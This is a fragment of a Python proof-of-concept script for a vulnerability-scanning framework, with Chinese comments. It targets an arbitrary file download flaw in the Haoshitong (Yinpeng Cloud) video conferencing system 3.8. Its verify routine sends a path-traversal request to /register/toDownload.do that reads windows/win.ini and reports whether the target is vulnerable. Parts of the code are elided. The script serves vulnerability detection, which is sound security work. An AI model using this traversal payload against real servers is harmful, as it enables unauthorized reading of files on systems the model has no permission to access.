...
POC_NAME = "HanmingVideoConferencingFileRead"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class HanmingVideoConferencingFileRead(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0012',    # PoC的VID编号
            'vbid': '',
            'Name': 'Hanming Video Conferencing File Read',    # PoC名称
            'Author': 'littl1fishr',    # PoC作者
            'Create_date': '2021-06-25',    # PoC创建时间
            },

        'vul': {
            'Product': '银澎云计算好视通视频会议系统',    # 漏洞所在产品名称
            'Version': '3.8',    # 产品的版本号
            'Type': 'Arbitrary',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                银澎云计算好视通视频会议系统任意文件下载漏洞
            ''',    # 漏洞简要描述
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini')
        headers = {
        ...
        if "[" in location:
            ...
            if verbose:
                highlight('[+] Hanming Video Conferencing File Read found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Hanming Video Conferencing File Read not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
